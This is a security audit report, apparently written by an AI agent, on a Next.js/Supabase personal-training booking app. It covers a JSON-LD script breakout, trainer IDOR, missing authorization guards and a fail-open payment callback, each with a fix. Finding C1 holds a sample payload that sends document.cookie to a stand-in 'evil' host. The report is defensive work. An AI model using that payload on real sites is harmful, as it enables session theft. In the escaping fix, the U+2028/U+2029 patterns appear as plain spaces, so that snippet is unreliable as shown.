# LEAP — Security Audit

Adversarial review of the deployed codebase. Threat model: authenticated-but-malicious client, malicious trainer (semi-trusted staff), and anonymous attacker hitting public endpoints.

## Scope correction (read first)

The brief assumed **Stripe + Eupago**, a **real-time bidding/auction engine**, and **invoices**. None of those exist in this codebase. The actual app is:

- **Payments:** IfthenPay only (MB Way, Multibanco, credit card), plus manual (cash/MBWay/Revolut) confirmed by an admin. No Stripe, no Eupago.
- **Domain:** a personal-training studio — bookings, packs/credits, clients. **There is no bidding engine and no auction**, so "bid manipulation" and "auction XSS" have no attack surface here. The integrity-critical equivalent is the **booking/credit ledger** and the **payment-confirmation callback**, which I audited in their place.
- **Stack:** Next.js 14 App Router, Supabase (Postgres + RLS + SECURITY DEFINER RPCs), Upstash rate-limiting, deployed on Vercel.

Overall this is a **well-secured codebase** — signature/anti-phishing verification, atomic idempotent payment confirmation, RLS, nonce-based CSP, and rate-limiting are already in place. The findings below are the real gaps, honestly graded.

---

## 🚨 Critical Vulnerabilities (Fix Immediately)

### C1 — Stored HTML/script injection via JSON-LD on the public trainer page

**File:** `app/t/[slug]/page.tsx` (lines ~57–96), data from `lib/public-trainer.ts`.

`personLd` embeds **user-controlled** fields — `name: t.fullName` and `description: t.bio` — and is written into a `<script type="application/ld+json">` via `dangerouslySetInnerHTML={{ __html: JSON.stringify(personLd) }}`.

`JSON.stringify` escapes quotes/backslashes but **does not escape `<`, `>`, `&`, or U+2028/U+2029**. A trainer who sets their bio (editable in `definicoes`, written by `saveTrainerBioAction`) to:

```
</script><script>fetch('https://evil/?c='+document.cookie)</script>
```

produces, on the **public, indexable, anonymous-accessible** page:

```html
<script type="application/ld+json">{...,"description":"</script><script>fetch(...)</script>"}</script>
```

The browser terminates the JSON-LD block at the injected `</script>` and parses attacker markup. This is a classic JSON-LD breakout.

**Current mitigation (why it's not yet game-over):** your CSP is `script-src 'self' 'nonce-…' 'strict-dynamic'`. The injected `<script>` has no nonce, so in modern browsers it is **blocked from executing**. That downgrades real-world impact — but you are one CSP regression (or one `'unsafe-inline'` slip, or one legacy browser) away from full stored XSS with cookie/session theft on a public page. Do not rely on CSP alone for an injection you can kill at the source in three lines.

**Fix —** escape the serialized JSON before injecting:

```ts
function jsonLdSafe(obj: unknown): string {
  return JSON.stringify(obj)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/ /g, "\\u2028")
    .replace(/ /g, "\\u2029");
}
// ...
<script type="application/ld+json" nonce={nonce}
  dangerouslySetInnerHTML={{ __html: jsonLdSafe(personLd) }} />
<script type="application/ld+json" nonce={nonce}
  dangerouslySetInnerHTML={{ __html: jsonLdSafe(profileLd) }} />
```

Also enforce server-side sanitisation of `bio`/`full_name` (strip `<`, `>`) in `saveTrainerBioAction` (`app/admin/definicoes/actions.ts:9`) and at trainer creation, as defense in depth.

---

## 🛡️ High-Risk Exposures

### H1 — Trainer-vs-trainer horizontal privilege escalation: `trainerId` trusted from form input

**Files:** `app/admin/definicoes/actions.ts` — `saveTrainerBioAction` (lines 9–18) and `saveSettingsAction` (lines 20–40+).

Both read the target trainer straight from client input:

```ts
const trainerId = String(formData.get("trainerId") ?? "");
await supabase.from("trainers").update({ bio }).eq("id", trainerId);          // bio
await (supabase as any).from("trainer_settings").upsert({ trainer_id: trainerId, ... }); // settings
```

There is **no check that `trainerId` belongs to the caller**. The only thing standing between trainer A and trainer B's settings is the RLS policy — and per the comment in `app/admin/agenda/actions.ts:191` ("a RLS de admin write deixa qualquer trainer/owner") your admin-write RLS is **role-based, not row-ownership-based**. That means any authenticated trainer can POST this action with another trainer's `trainerId` and overwrite their bio, cancellation window, slot durations, buffer, late-cancel charging, etc. In a single-owner studio the blast radius is small; with multiple trainers it's a real IDOR between staff.

**Fix —** verify ownership server-side, never trust the form's `trainerId`:

```ts
const myTrainerId = await getCurrentTrainerId();
const profile = await getCurrentProfile();
const trainerId = String(formData.get("trainerId") ?? "");
if (profile?.role !== "owner" && trainerId !== myTrainerId) {
  setFlash("Sem permissão.", "error"); return;
}
```

(Owners may legitimately edit any trainer in scope; trainers only themselves.) Better still, tighten the RLS `USING`/`WITH CHECK` on `trainers`/`trainer_settings` to `profile_id = auth.uid()` for non-owners so the DB enforces it regardless of the action code.

### H2 — Inconsistent authorization model on admin server actions (defense-in-depth gap)

`app/admin/equipa/actions.ts` does this correctly — every action calls `requireOwner()` at the top (lines 8–18). But the other admin action modules (`clientes/[id]/actions.ts`, `definicoes/actions.ts`, `loja/actions.ts`, `promocoes/actions.ts`) have **no explicit role/authz check at the function boundary** and rely entirely on the underlying SECURITY DEFINER RPCs and RLS to reject non-admins.

Server Actions are independently invocable POST endpoints — an attacker doesn't need to load the `/admin` layout to call them. Today RLS/RPCs do reject a plain `client` role, so this is not currently exploitable, but it's fragile: the security of `grantPackAction`, `adjustCreditsAction`, `createProductAction`, `saveSettingsAction`, etc. depends on every RPC and every RLS policy being perfect, with no second layer. One dropped/misconfigured policy = silent privilege escalation.

**Fix —** add a shared guard and call it first in every admin action, mirroring `requireOwner`:

```ts
// lib/authz.ts
export async function requireStaff() {
  const p = await getCurrentProfile();
  if (p?.role !== "trainer" && p?.role !== "owner") throw new Error("Acesso restrito.");
  return p;
}
```

This makes authz explicit and auditable instead of emergent.

### H3 — IfthenPay callback IP allow-list is fail-open by default

**Files:** `lib/ifthenpay.ts` (`ifthenpayCallbackIpAllowed`, lines ~150–175) and `.env.example`.

When `IFTHENPAY_CALLBACK_ALLOWED_IPS` is unset, the gate returns `{ allowed: true }` (documented "fail-open: não partir pagamentos"). So in any environment where that env var hasn't been populated, the network-origin defense is **off**, and the callback's integrity rests entirely on the anti-phishing key — which (by IfthenPay's design) travels in the **query string** and therefore lands in Vercel request logs, browser history, and any proxy logs. Anyone who reads a log line can replay a crafted callback from any IP.

The amount-validation + `FOR UPDATE` idempotency in `confirm_ifthenpay_callback` still prevent double-credit and amount tampering (good), but an attacker who learns the key could forge a "paid" confirmation for a real pending order at the correct amount.

**Fix —** Treat the IP allow-list as required in production: obtain IfthenPay's source IPs and set `IFTHENPAY_CALLBACK_ALLOWED_IPS`, and make production **fail-closed** (log-and-alert, but consider hard-failing) when it's empty. Separately, scrub the `key`/`Key` query param in your log drain so the shared secret never persists in logs.

### H4 — Manual-payment confirmation has no rate limit / abuse signal on the polling surface

The manual-payment page (`app/app/compras/[id]/manual/page.tsx`) is correctly scoped to `client_id = user.id` (no IDOR). But note that **only** the auth/register/webhook routes are rate-limited in `middleware.ts` (the `RATE_LIMITED` map). The IfthenPay callback bucket is 60/min which is fine; just confirm the webhook bucket key includes the source IP (it does: `${path}:${ip}`). No action needed on the exports — `me/export` and `relatorios/export` already call `rateLimit("export", …)` directly and the latter enforces role + trainer-scope + a 366-day PII window (good, keep it).

---

## 🔐 Security Best Practices

- **Constant-time CRON secret check.** `app/api/cron/*/route.ts` compares `auth !== \`Bearer ${secret}\``. With a high-entropy secret the timing leak is negligible, but use a `timingSafeEqual` helper (you already have `safeEqual` in `lib/ifthenpay.ts`) for consistency.
- **`zod` is a dependency but imported nowhere** (0 usages). All input handling is manual `String(...)`/`Number(...)`. That's currently careful, but adopt zod schemas at every server-action / route boundary so validation is declarative and uniform — it would have made H1 (the unchecked `trainerId`) structurally harder to introduce.
- **`enroll-card.tsx:70`** injects the 2FA QR via `dangerouslySetInnerHTML={{ __html: extractSvg(enrolling.qrCode) }}`. The source is the Supabase TOTP enroll response (trusted, not user input), so risk is low — but validate the payload starts with `<svg` and contains no `<script>`/`on*=` before injecting, as belt-and-suspenders.
- **JSON-LD/`bio` length + charset.** `saveTrainerBioAction` already caps bio at 500 chars; add an allow-list/strip of angle brackets there too (pairs with C1).
- **No SQL/NoSQL injection surface found.** All DB access goes through the Supabase client (parameterised PostgREST) and SECURITY DEFINER RPCs — no string-built SQL. The `/api/calendar/feed/[token]` route correctly validates the token shape (`/^[0-9a-f-]{36}$/i`) before querying. Good.
- **Service-role usage is well-contained.** `SUPABASE_SERVICE_ROLE_KEY` is only ever read server-side (`lib/supabase/server.ts`, two guarded inline admin clients). No `NEXT_PUBLIC_` secret leakage — the only public envs are the anon key, app URL/name, the VAPID **public** key, and a business MBWay phone, all of which are safe to expose.
- **CSP is strong** (nonce + `strict-dynamic`, `object-src 'none'`, `frame-ancestors 'none'`, `form-action 'self'`). The one weakness is `style-src 'unsafe-inline'` (Next 14 hydration requirement) — acceptable, and the C1 fix removes the practical XSS that could abuse it.
- **PII minimisation in exports** is already done well (self-scope on `me/export`; role + trainer-scope + time-window on `relatorios/export`). Keep the trainer-scope filter — the code comment shows it patched a prior cross-trainer leak.

---

### Priority order
1. **C1** — escape JSON-LD (3 lines) + sanitise bio/name at write. Real injection on a public page.
2. **H1** — stop trusting `trainerId` from form input in `definicoes` actions; tighten RLS to row-ownership.
3. **H2** — add `requireStaff()`/`requireOwner()` guards to every admin action for defense in depth.
4. **H3** — populate and enforce the IfthenPay IP allow-list in prod; scrub the anti-phishing key from logs.
5. Best-practice items as cleanup.

> Note: H1/H2 severity assumes the role-based (not ownership-based) admin RLS described in the code comments. Confirm the actual `trainers` / `trainer_settings` / `purchases` RLS policies in Supabase — if any are already `auth.uid()`-scoped, downgrade accordingly. I audited application code; I could not see the live SQL policies from here.
